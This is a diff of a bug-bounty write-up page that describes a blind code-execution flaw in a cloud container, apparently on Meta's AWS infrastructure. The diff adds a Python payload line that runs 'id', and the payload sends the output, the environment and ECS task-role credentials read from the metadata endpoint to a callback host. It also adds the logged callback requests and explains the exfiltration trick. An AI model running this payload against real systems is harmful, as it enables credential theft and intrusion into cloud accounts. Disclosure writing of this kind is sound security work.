@@ -181,16 +181,20 @@ Content-Type: application/json
         <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>python · h1_rce_module4.py</span><button class="code__copy" type="button">copy</button></div>
         <pre><code>import os, urllib.request, base64, json
 
-CALLBACK = "http://YOUR_CALLBACK_DOMAIN"
+CALLBACK = "http://YOUR_COLLAB.oast.online"
 
 try:
     env = dict(os.environ)
+    whoami = os.popen("id").read()
     creds_uri = env.get("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
     aws_creds = ""
     if creds_uri:
         aws_creds = urllib.request.urlopen(
             "http://169.254.170.2" + creds_uri, timeout=5
         ).read().decode()
+    urllib.request.urlopen(
+        CALLBACK + "/id?d=" + base64.b64encode(whoami.encode()).decode(), timeout=10,
+    )
     urllib.request.urlopen(
         CALLBACK + "/env?d=" + base64.b64encode(json.dumps(env).encode()).decode(),
         timeout=10,
@@ -303,14 +307,36 @@ X-API-Key: apprunner_fast_graphrag_fgr_k3y_8x4n9p2q...</code></pre>
 
       <h2>The side channel: proof it ran, as root</h2>
       <p>Because it was blind, the module did all of its work in place and mailed the results back
-      to me. It read the container environment and the ECS task role credentials from the metadata
-      service, base64 encoded them, and sent them as plain HTTP requests to a callback host I
-      controlled (I used an Interactsh server). No callback meant the attempt had failed. A
-      callback meant my code had run and the data was already on its way out. That is the whole
-      exfil trick with a blind bug: when you cannot read the response, you make the server come
-      talk to you.</p>
-      <p>It ran. My callback server lit up with hits from <code>34.212.88.131</code>, which is
-      Meta's AWS us-west-2 range on ECS Fargate. The container was running as root.</p>
+      to me. It read the process identity, the container environment, and the ECS task role
+      credentials from the metadata service, base64 encoded each one, and sent them out as plain
+      HTTP GET requests to a callback host I controlled (I used an Interactsh server). No callback
+      meant the attempt had failed. A callback meant my code had run and the data was already on its
+      way out. That is the whole exfil trick with a blind bug: when you cannot read the response,
+      you make the server come talk to you.</p>
+      <p>It ran. Three requests landed on my callback server from <code>34.212.88.131</code>, which
+      is Meta's AWS us-west-2 range on ECS Fargate, each carrying a piece of the container base64
+      encoded in the query string:</p>
+
+      <div class="code">
+        <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>http · interactsh callbacks</span><button class="code__copy" type="button">copy</button></div>
+        <pre><code>GET /id?d=dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAo... HTTP/1.1
+Host: YOUR_COLLAB.oast.online
+User-Agent: Python-urllib/3.11
+remote-address: 34.212.88.131
+
+GET /env?d=eyJEQVRBU0VUX0JVQ0tFVCI6ICJnZW9yZ2VsaXZla2l0... HTTP/1.1
+Host: YOUR_COLLAB.oast.online
+User-Agent: Python-urllib/3.11
+remote-address: 34.212.88.131
+
+GET /awscreds?d=eyJBY2Nlc3NLZXlJZCI6ICJBU0lBWUtDWUdXN1I... HTTP/1.1
+Host: YOUR_COLLAB.oast.online
+User-Agent: Python-urllib/3.11
+remote-address: 34.212.88.131</code></pre>
+      </div>
+
+      <p>The <code>Python-urllib</code> user agent is the module calling out from inside the
+      container. Decoding the first blob confirmed it was running as root:</p>
 
       <div class="code">
         <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>text</span><button class="code__copy" type="button">copy</button></div>
@@ -318,8 +344,8 @@ X-API-Key: apprunner_fast_graphrag_fgr_k3y_8x4n9p2q...</code></pre>
 host=ip-10-0-249-248.us-west-2.compute.internal</code></pre>
       </div>
 
-      <p>The environment beacon gave me everything I needed to pivot into AWS, including the path
-      to the container credentials endpoint:</p>
+      <p>Decoding the second blob gave the full environment, including the path to the container
+      credentials endpoint:</p>
 
       <div class="code">
         <div class="code__bar"><span class="code__dots"><i></i><i></i><i></i></span><span>json · container env</span><button class="code__copy" type="button">copy</button></div>
